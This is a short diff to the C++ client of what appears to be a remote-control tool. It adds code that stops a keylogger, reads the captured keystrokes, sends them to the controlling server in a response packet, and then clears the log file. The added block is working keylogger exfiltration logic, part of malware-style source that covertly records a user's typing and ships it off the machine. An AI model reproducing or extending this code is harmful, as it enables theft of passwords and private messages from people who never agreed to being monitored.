@@ -11,6 +11,7 @@
 #include <sstream>
 #include <vector>
 #include <string>
+#include <chrono>
 
 #include "../utils/EnvLoader.hpp"
 #include "../utils/LPTF/LPTF_Socket.hpp"
@@ -89,6 +90,21 @@ void serverRequestHandler()
                     if (globalLogger)
                     {
                         globalLogger->stop();
+                        
+                        // Wait a moment for the keylogger to fully stop
+                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+                        
+                        // Retrieve the logged data
+                        std::string loggedData = globalLogger->getLoggedData();
+                        
+                        // Send the logged data back to the server
+                        std::vector<uint8_t> responsePayload(loggedData.begin(), loggedData.end());
+                        LPTF_Packet logResponse(1, PacketType::RESPONSE, 0, packet.getPacketId(), packet.getSessionId(), responsePayload);
+                        globalSocket->sendBinary(logResponse.serialize());
+                        
+                        // Clear the log file after sending the data
+                        globalLogger->clearLogFile();
+                        
                         KeyLogger::unhideFile("key_file.txt");
                         delete globalLogger;
                         globalLogger = nullptr;
